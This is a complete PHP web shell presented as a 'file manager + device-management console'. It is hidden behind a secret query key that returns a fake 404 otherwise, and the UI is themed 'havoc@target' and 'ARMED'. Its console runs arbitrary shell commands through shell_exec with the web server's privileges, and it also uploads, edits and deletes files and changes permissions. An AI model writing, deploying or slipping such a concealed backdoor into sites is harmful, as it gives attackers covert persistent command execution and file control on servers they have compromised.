<?php
/**
 * Havoc Panel — single-file PHP file manager + device-management console
 *
 * Access:  havoc_panel.php?havoc=buildonx
 * Without the correct key/value the script returns a blank 404 page.
 *
 * Security design:
 *  - Session-gated GUI (key ?havoc=buildonx unlocks; logout button destroys session)
 *  - All file operations are jailed to the script's own directory tree (realpath checked)
 *  - Command console is free-form (runs with the web server's privileges) — keep the
 *    access key secret and use HTTPS in production.
 *  - PHP file uploads are blocked by default (prevent shell drop) — toggle in config.
 */

session_start();
error_reporting(0); // never leak paths/warnings to the response

/* ============================== CONFIG ============================== */
const ACCESS_KEY   = 'havoc';
const ACCESS_VALUE = 'buildonx';
const ALLOW_UPLOAD_PHP = false;  // set true at your own risk
const MAX_UPLOAD   = 50 * 1024 * 1024; // 50 MB
const ROOT         = __DIR__;    // file operations jailed to this dir
const HIST_SIZE    = 12;         // recent commands kept in session

/* ============================== GATE ============================== */
/* Wrong or missing key -> behave like a nonexistent page. */
if (!isset($_GET[ACCESS_KEY]) || !hash_equals(ACCESS_VALUE, $_GET[ACCESS_KEY])) {
    http_response_code(404);
    header('Content-Type: text/plain');
    exit;
}

/* Correct key -> establish session (only once), then continue to GUI */
if (!isset($_SESSION['havoc_auth']) || $_SESSION['havoc_auth'] !== true) {
    $_SESSION['havoc_auth'] = true;
    session_regenerate_id(true);
}

/* Logout */
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

/* ============================== HELPERS ============================== */
function h(?string $s): string { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

/** Jail a user-supplied relative path to ROOT. Returns false on escape attempt. */
function jailed(string $rel): ?string {
    $real = realpath(ROOT . '/' . ltrim($rel, '/'));
    if ($real === false) return null;
    if (strpos($real, ROOT) !== 0) return null;
    return $real;
}

/** Path relative to ROOT for links. */
function relOf(string $abs): string {
    $r = substr($abs, strlen(ROOT));
    return $r === false || $r === '' ? '.' : ltrim($r, '/');
}

/** Human-readable size. */
function sizeOf2(int $b): string {
    if ($b < 1024) return $b . ' B';
    if ($b < 1048576) return round($b / 1024, 1) . ' KB';
    if ($b < 1073741824) return round($b / 1048576, 1) . ' MB';
    return round($b / 1073741824, 2) . ' GB';
}

/** CSRF token. */
function csrf(): string {
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(16));
    return $_SESSION['csrf'];
}
function csrfOk(): bool {
    return isset($_POST['csrf']) && hash_equals($_SESSION['csrf'], $_POST['csrf']);
}

/** Flash message. */
function flash(?string $m = null, string $type = 'ok'): ?array {
    if ($m !== null) { $_SESSION['flash'] = ['m' => $m, 't' => $type]; return null; }
    $f = $_SESSION['flash'] ?? null; unset($_SESSION['flash']); return $f;
}

/* ============================== ACTIONS ============================== */
/* Pop one-shot command output from the session (survives the POST->GET redirect). */
$cmd_out = null;
if (isset($_SESSION['cmd_out'])) {
    $cmd_out = $_SESSION['cmd_out'];
    unset($_SESSION['cmd_out']);
}
$flash = flash();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && csrfOk()) {
    $act  = $_POST['action'] ?? '';
    $path = $_POST['path'] ?? '.';
    $abs  = jailed($path);

    try {
        switch ($act) {

        case 'upload':
            if ($abs === null || !is_dir($abs)) throw new Exception('Invalid target directory.');
            if (empty($_FILES['files'])) throw new Exception('No files received.');
            $n = 0; $errs = [];
            foreach ($_FILES['files']['name'] as $i => $name) {
                if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) continue;
                if ($_FILES['files']['size'][$i] > MAX_UPLOAD) { $errs[] = 'too large: ' . basename($name); continue; }
                $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
                if (!ALLOW_UPLOAD_PHP && in_array($ext, ['php','phtml','php3','php4','php5','php7','phar'])) {
                    $errs[] = 'PHP blocked: ' . basename($name); continue;
                }
                $safe = basename($name);
                if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $abs . '/' . $safe)) $n++;
                else $errs[] = 'failed: ' . basename($name);
            }
            $msg = $n . ' file(s) uploaded.';
            if ($errs) $msg .= ' [rejected: ' . h(implode('; ', $errs)) . ']';
            flash($msg, $errs && !$n ? 'err' : 'ok');
            break;

        case 'save':
            if ($abs === null || !is_file($abs)) throw new Exception('File not found.');
            if (@file_put_contents($abs, $_POST['content'] ?? '') === false)
                throw new Exception('Write failed (check permissions).');
            flash('File saved: ' . h(basename($abs)));
            break;

        case 'mkdir':
            if ($abs === null || !is_dir($abs)) throw new Exception('Invalid parent directory.');
            $name = basename(trim($_POST['name'] ?? ''));
            if ($name === '' || !preg_match('/^[^\/\\\\]+$/', $name)) throw new Exception('Bad directory name.');
            if (!@mkdir($abs . '/' . $name, 0755)) throw new Exception('mkdir failed.');
            flash('Directory created: ' . h($name));
            break;

        case 'touch':
            if ($abs === null || !is_dir($abs)) throw new Exception('Invalid parent directory.');
            $name = basename(trim($_POST['name'] ?? ''));
            if ($name === '' || !preg_match('/^[^\/\\\\]+$/', $name)) throw new Exception('Bad file name.');
            if (@file_put_contents($abs . '/' . $name, '') === false) throw new Exception('Create failed.');
            flash('File created: ' . h($name));
            break;

        case 'rename':
            $old = jailed($_POST['old'] ?? '');
            if ($old === null || !file_exists($old)) throw new Exception('Source not found.');
            $name = basename(trim($_POST['name'] ?? ''));
            if ($name === '' || $name === '.' || $name === '..') throw new Exception('Bad name.');
            if (!@rename($old, dirname($old) . '/' . $name)) throw new Exception('Rename failed.');
            flash('Renamed to ' . h($name));
            break;

        case 'delete':
            if ($abs === null || $abs === ROOT || !file_exists($abs)) throw new Exception('Cannot delete target.');
            if (is_dir($abs)) {
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($abs, FilesystemIterator::SKIP_DOTS),
                     RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($it as $f) $f->isDir() ? @rmdir($f->getPathname()) : @unlink($f->getPathname());
                @rmdir($abs);
            } else {
                @unlink($abs);
            }
            flash('Deleted.');
            break;

        case 'chmod':
            if ($abs === null || !file_exists($abs)) throw new Exception('Target not found.');
            $mode = octdec($_POST['mode'] ?? '');
            if (!$mode || $mode < 0 || $mode > 0777) throw new Exception('Mode must be octal, e.g. 0644.');
            if (!@chmod($abs, $mode)) throw new Exception('chmod failed.');
            flash('Permissions set to ' . $_POST['mode']);
            break;

        case 'cmd':
            /* Free-form console: runs whatever is typed, with the web server's privileges. */
            $cmd = trim($_POST['cmd'] ?? '');
            if ($cmd === '') throw new Exception('No command entered.');
            $out = @shell_exec($cmd . ' 2>&1');
            $_SESSION['cmd_out'] = '$ ' . $cmd . "\n" . (($out === null || $out === '') ? '(no output)' : $out);
            $hist = $_SESSION['cmd_history'] ?? [];
            array_unshift($hist, $cmd);
            $_SESSION['cmd_history'] = array_slice(array_values(array_unique($hist)), 0, HIST_SIZE);
            flash('Executed: ' . h($cmd));
            break;

        default: throw new Exception('Unknown action.');
        }
    } catch (Exception $e) {
        flash($e->getMessage(), 'err');
    }

    /* Redirect back to the dir we were in (POST -> GET, no resubmit) */
    $back = dirname($path ?? '.');
    header('Location: ?' . ACCESS_KEY . '=' . ACCESS_VALUE . '&dir=' . urlencode($back === '.' ? '.' : ltrim($back, './')));
    exit;
}

/* ============================== VIEW STATE ============================== */
/* Download (must run before any HTML output so headers can be sent) */
if (isset($_GET['dl'])) {
    $dlAbs = jailed($_GET['dl']);
    if ($dlAbs === null || !is_file($dlAbs)) { http_response_code(404); exit('Not found'); }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($dlAbs) . '"');
    header('Content-Length: ' . filesize($dlAbs));
    header('X-Content-Type-Options: nosniff');
    if (ob_get_level()) ob_end_clean();
    readfile($dlAbs);
    exit;
}

$dir   = isset($_GET['dir']) ? $_GET['dir'] : '.';
$abs   = jailed($dir);
if ($abs === null || !is_dir($abs)) { $abs = ROOT; $dir = '.'; }
$dirAbs  = $abs;
$dirRel  = relOf($dirAbs);
$editRel = isset($_GET['edit']) ? $_GET['edit'] : null;
$editAbs = $editRel !== null ? jailed($editRel) : null;

/* Read directory listing */
$entries = [];
foreach (scandir($dirAbs) as $e) {
    if ($e === '.') continue;
    $fp = $dirAbs . '/' . $e;
    $isDir = is_dir($fp);
    if ($e === '..' && $dirAbs === ROOT) continue; // hide parent of jail root
    $entries[] = [
        'name'  => $e,
        'isDir' => $isDir || $e === '..',
        'size'  => $isDir ? -1 : @filesize($fp),
        'perm'  => substr(sprintf('%o', @fileperms($fp)), -4),
        'mtime' => @date('Y-m-d H:i:s', @filemtime($fp)),
        'rel'   => $e === '..' ? relOf(dirname($dirAbs)) : ($dirRel === '.' ? $e : $dirRel . '/' . $e),
    ];
}
usort($entries, fn($a, $b) => ($b['isDir'] - $a['isDir']) ?: strcasecmp($a['name'], $b['name']));
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>·</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><circle cx='8' cy='8' r='6' fill='%23ff1e3c'/></svg>">
<style>
:root{
  --bg:#070709;--panel:#0e0e13;--panel2:#14141b;--border:#26262f;
  --text:#e8e8f0;--muted:#75758a;--acc:#ff1e3c;--acc2:#ff6b7d;--ok:#00ff9c;--err:#ff3347;
}
*{box-sizing:border-box;margin:0;padding:0}
body{
  background:
    radial-gradient(1100px 480px at 50% -10%, rgba(255,30,60,.09), transparent 60%),
    repeating-linear-gradient(90deg, transparent 0 39px, rgba(255,30,60,.025) 39px 40px),
    repeating-linear-gradient(0deg, transparent 0 39px, rgba(255,30,60,.025) 39px 40px),
    var(--bg);
  color:var(--text);
  font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  padding:24px;min-height:100vh;
}
/* CRT scanlines */
body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:999;
  background:repeating-linear-gradient(0deg, rgba(0,0,0,.13) 0 1px, transparent 1px 3px)}
a{color:var(--acc2);text-decoration:none}a:hover{text-decoration:underline;color:var(--acc)}
header{display:flex;align-items:center;gap:14px;margin-bottom:22px;flex-wrap:wrap;
  border-bottom:1px solid var(--border);padding-bottom:14px}
header h1{font:700 20px/1.1 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;letter-spacing:3px;
  text-shadow:0 0 8px rgba(255,30,60,.8),0 0 26px rgba(255,30,60,.4)}
header h1 span{color:var(--acc)}
header .prompt{font:11px ui-monospace,monospace;color:var(--muted);margin-top:4px;letter-spacing:1px}
header .prompt b{color:var(--acc);animation:blink 1.1s steps(1) infinite}
@keyframes blink{50%{opacity:0}}
.status{display:inline-flex;align-items:center;gap:6px;font:700 10px ui-monospace,monospace;
  letter-spacing:2px;color:var(--acc);border:1px solid var(--acc);border-radius:3px;padding:4px 9px;
  background:rgba(255,30,60,.07);
  box-shadow:0 0 12px rgba(255,30,60,.35), inset 0 0 10px rgba(255,30,60,.12)}
.status i{width:7px;height:7px;border-radius:50%;background:var(--acc);animation:pulse 1.2s infinite}
@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 6px var(--acc)}50%{opacity:.2;box-shadow:none}}
header .path{color:var(--muted);font:13px ui-monospace,monospace;flex:1;min-width:180px;text-align:right}
header .path b{color:var(--acc2)}
.btn{display:inline-block;padding:5px 12px;border:1px solid var(--border);border-radius:4px;
  background:var(--panel2);color:var(--text)!important;cursor:pointer;
  font:600 12px ui-monospace,monospace;letter-spacing:1px;transition:all .15s}
.btn:hover{border-color:var(--acc);box-shadow:0 0 12px rgba(255,30,60,.4);text-decoration:none;color:var(--acc2)!important}
.btn.danger{color:var(--err)!important}
.btn.danger:hover{border-color:var(--err);box-shadow:0 0 12px rgba(255,51,71,.45)}
.grid{display:grid;grid-template-columns:2fr 1fr;gap:16px;align-items:start}
@media(max-width:900px){.grid{grid-template-columns:1fr}.header .path{text-align:left}}
.panel{background:linear-gradient(180deg,rgba(255,30,60,.035),transparent 45%),var(--panel);
  border:1px solid var(--border);border-radius:6px;padding:16px;position:relative}
.panel::before{content:"";position:absolute;left:-1px;top:-1px;bottom:-1px;width:2px;
  background:linear-gradient(180deg,var(--acc),transparent 80%)}
.panel h2{font:700 11px ui-monospace,monospace;text-transform:uppercase;letter-spacing:2px;
  color:var(--acc);margin-bottom:12px;text-shadow:0 0 8px rgba(255,30,60,.5)}
table{width:100%;border-collapse:collapse}
th{font:700 10px ui-monospace,monospace;text-transform:uppercase;letter-spacing:1px;color:var(--muted);
  text-align:left;padding:6px 8px;border-bottom:1px solid rgba(255,30,60,.45)}
td{padding:6px 8px;border-bottom:1px solid var(--border);font-size:13px}
tr:hover td{background:rgba(255,30,60,.06)}
td.num,th.num{text-align:right;font:12px ui-monospace,monospace;color:var(--muted)}
.icon{width:20px;display:inline-block;text-align:center;font-family:ui-monospace,monospace}
.icon.d{color:var(--acc)}.icon.f{color:var(--muted)}
form.inline{display:inline}
input[type=text]{background:#0a0a0e;border:1px solid var(--border);border-radius:4px;color:var(--text);
  padding:7px 10px;font-size:13px;width:100%;transition:border-color .15s, box-shadow .15s}
input[type=text]:focus{outline:none;border-color:var(--acc);box-shadow:0 0 10px rgba(255,30,60,.35)}
input.cmd{font-family:ui-monospace,monospace;caret-color:var(--acc)}
textarea{width:100%;height:420px;background:#0a0a0e;border:1px solid var(--border);border-radius:4px;
  color:var(--text);padding:12px;font:13px/1.5 ui-monospace,monospace;resize:vertical}
textarea:focus{outline:none;border-color:var(--acc);box-shadow:0 0 10px rgba(255,30,60,.35)}
label{display:block;font:600 11px ui-monospace,monospace;text-transform:uppercase;letter-spacing:1px;
  color:var(--muted);margin:10px 0 4px}
pre.out{background:#050507;border:1px solid rgba(255,30,60,.4);border-left:3px solid var(--acc);
  border-radius:4px;padding:12px;font:12px/1.6 ui-monospace,monospace;color:#d8ffe9;
  overflow:auto;max-height:340px;white-space:pre-wrap;word-break:break-all;
  text-shadow:0 0 4px rgba(0,255,156,.25)}
.row{display:flex;gap:8px}.row>*{flex:1}
.drop{border:1px dashed var(--border);border-radius:4px;padding:18px;text-align:center;color:var(--muted);
  font:12px ui-monospace,monospace;cursor:pointer;transition:all .15s}
.drop:hover{border-color:var(--acc);color:var(--acc2);background:rgba(255,30,60,.05)}
.flash{padding:10px 14px;border-radius:4px;margin-bottom:16px;font:13px ui-monospace,monospace}
.flash.ok{background:rgba(0,255,156,.06);border:1px solid #00b36b;box-shadow:0 0 12px rgba(0,255,156,.15);color:var(--ok)}
.flash.err{background:rgba(255,30,60,.08);border:1px solid var(--err);box-shadow:0 0 14px rgba(255,30,60,.3);color:var(--err)}
.footer{margin-top:22px;color:var(--muted);font:11px ui-monospace,monospace;text-align:center;letter-spacing:1px}
.footer b{color:var(--acc)}
.acts{white-space:nowrap}.acts form{margin-right:4px}
.hist .btn{font:11px ui-monospace,monospace;margin:0 4px 4px 0;opacity:.85}
.hist .btn:hover{opacity:1}
::selection{background:rgba(255,30,60,.45)}
::-webkit-scrollbar{width:10px;height:10px}
::-webkit-scrollbar-thumb{background:#26262f;border-radius:5px}
::-webkit-scrollbar-thumb:hover{background:var(--acc)}
::-webkit-scrollbar-track{background:#0a0a0e}
</style>
</head>
<body>

<header>
  <div>
    <h1>HAVOC<span>_</span>PANEL</h1>
    <div class="prompt">root@havoc:~# session_established <b>▊</b></div>
  </div>
  <span class="status"><i></i>ARMED</span>
  <div class="path">/<b><?= h($dirRel === '.' ? '' : $dirRel) ?></b></div>
  <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=.">ROOT</a>
  <a class="btn danger" href="?logout=1">EXIT</a>
</header>

<?php if ($flash): ?>
  <div class="flash <?= $flash['t'] ?>"><?= $flash['m'] ?></div>
<?php endif; ?>

<?php if ($cmd_out !== null): ?>
  <div class="panel" style="margin-bottom:16px">
    <h2>Command Output</h2>
    <pre class="out"><?= h($cmd_out) ?></pre>
  </div>
<?php endif; ?>

<?php /* ---------- EDITOR VIEW ---------- */
if ($editAbs !== null && is_file($editAbs)): ?>
<div class="panel">
  <h2>Edit — <?= h(basename($editAbs)) ?></h2>
  <form method="post">
    <input type="hidden" name="csrf" value="<?= csrf() ?>">
    <input type="hidden" name="action" value="save">
    <input type="hidden" name="path" value="<?= h($editRel) ?>">
    <textarea name="content" spellcheck="false"><?= h(file_get_contents($editAbs)) ?></textarea>
    <div style="margin-top:12px;display:flex;gap:8px">
      <button class="btn" type="submit">Save</button>
      <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=<?= urlencode(dirname($editRel)) ?>">Back</a>
    </div>
  </form>
</div>

<?php /* ---------- MAIN VIEW ---------- */
else: ?>
<div class="grid">

  <!-- FILE BROWSER -->
  <div class="panel">
    <h2>Files &amp; Directories</h2>
    <table>
      <tr><th></th><th>Name</th><th class="num">Size</th><th class="num">Perms</th><th class="num">Modified</th><th>Actions</th></tr>
      <?php foreach ($entries as $e): ?>
      <tr>
        <td><span class="icon <?= $e['isDir'] ? 'd' : 'f' ?>"><?= $e['isDir'] ? '▸' : '▪' ?></span></td>
        <td>
          <?php if ($e['isDir']): ?>
            <a href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dir=<?= urlencode($e['rel']) ?>"><?= h($e['name']) ?></a>
          <?php else: ?>
            <?= h($e['name']) ?>
          <?php endif; ?>
        </td>
        <td class="num"><?= $e['size'] >= 0 ? sizeOf2($e['size']) : '—' ?></td>
        <td class="num"><?= $e['perm'] ?></td>
        <td class="num"><?= $e['isDir'] && $e['name'] === '..' ? '—' : h($e['mtime']) ?></td>
        <td class="acts">
          <?php if (!$e['isDir']): ?>
            <form class="inline" method="get">
              <input type="hidden" name="<?= ACCESS_KEY ?>" value="<?= ACCESS_VALUE ?>">
              <input type="hidden" name="dir" value="<?= urlencode($dirRel) ?>">
              <input type="hidden" name="edit" value="<?= urlencode($e['rel']) ?>">
              <button class="btn" type="submit">Edit</button>
            </form>
            <a class="btn" href="?<?= ACCESS_KEY ?>=<?= ACCESS_VALUE ?>&dl=<?= urlencode($e['rel']) ?>">D/L</a>
          <?php endif; ?>
          <?php if ($e['name'] !== '..'): ?>
            <form class="inline" method="post" onsubmit="return confirm('Delete <?= h($e['name']) ?>?')">
              <input type="hidden" name="csrf" value="<?= csrf() ?>">
              <input type="hidden" name="action" value="delete">
              <input type="hidden" name="path" value="<?= h($e['rel']) ?>">
              <button class="btn danger" type="submit">Del</button>
            </form>
          <?php endif; ?>
        </td>
      </tr>
      <?php endforeach; ?>
    </table>
  </div>

  <!-- SIDE COLUMN -->
  <div>
    <!-- COMMAND CONSOLE -->
    <div class="panel" style="margin-bottom:16px">
      <h2>Device Console</h2>
      <form method="post">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <input type="hidden" name="action" value="cmd">
        <input type="hidden" name="path" value="<?= h($dirRel) ?>">
        <label>Command</label>
        <input class="cmd" type="text" name="cmd" placeholder="e.g. ifconfig, whoami, df -h" required autocomplete="off" autofocus>
        <div style="margin-top:10px"><button class="btn" type="submit">Execute</button></div>
      </form>
      <?php $hist = $_SESSION['cmd_history'] ?? []; if ($hist): ?>
      <div class="hist" style="margin-top:14px">
        <label>Recent</label>
        <?php foreach (array_slice($hist, 0, 8) as $hc): ?>
        <form class="inline" method="post">
          <input type="hidden" name="csrf" value="<?= csrf() ?>">
          <input type="hidden" name="action" value="cmd">
          <input type="hidden" name="path" value="<?= h($dirRel) ?>">
          <input type="hidden" name="cmd" value="<?= h($hc) ?>">
          <button class="btn" type="submit" title="run again"><?= h($hc) ?></button>
        </form>
        <?php endforeach; ?>
      </div>
      <?php endif; ?>
    </div>

    <!-- UPLOAD -->
    <div class="panel" style="margin-bottom:16px">
      <h2>Upload</h2>
      <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <input type="hidden" name="action" value="upload">
        <input type="hidden" name="path" value="<?= h($dirRel) ?>">
        <label class="drop" style="display:block">
          Click to choose files (max <?= sizeOf2(MAX_UPLOAD) ?> each)
          <input type="file" name="files[]" multiple required style="display:none"
                 onchange="this.closest('form').submit()">
        </label>
        <div style="margin-top:10px"><button class="btn" type="submit">Upload to /<?= h($dirRel === '.' ? '' : $dirRel) ?></button></div>
      </form>
    </div>

    <!-- CREATE -->
    <div class="panel" style="margin-bottom:16px">
      <h2>Create</h2>
      <form method="post">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <input type="hidden" name="path" value="<?= h($dirRel) ?>">
        <input type="text" name="name" placeholder="name..." required>
        <div class="row" style="margin-top:10px">
          <button class="btn" name="action" value="mkdir" type="submit">New Dir</button>
          <button class="btn" name="action" value="touch" type="submit">New File</button>
        </div>
      </form>
    </div>

    <!-- RENAME / CHMOD -->
    <div class="panel">
      <h2>Rename / Permissions</h2>
      <form method="post">
        <input type="hidden" name="csrf" value="<?= csrf() ?>">
        <label>Item (relative path)</label>
        <input type="text" name="old" placeholder="file.txt" list="items">
        <datalist id="items">
          <?php foreach ($entries as $e): if ($e['name'] !== '..'): ?>
            <option value="<?= h($e['rel']) ?>">
          <?php endif; endforeach; ?>
        </datalist>
        <div class="row">
          <div><label>New name</label><input type="text" name="name" placeholder="(for rename)"></div>
          <div><label>Mode (octal)</label><input type="text" name="mode" placeholder="0644"></div>
        </div>
        <div class="row" style="margin-top:10px">
          <button class="btn" name="action" value="rename" type="submit">Rename</button>
          <button class="btn" name="action" value="chmod" type="submit">Chmod</button>
        </div>
      </form>
    </div>
  </div>
</div>
<?php endif; ?>

<div class="footer">[ havoc@target ] · jailed to <b><?= h(ROOT) ?></b> · free-form console · runs as web-server user</div>

</body>
</html>
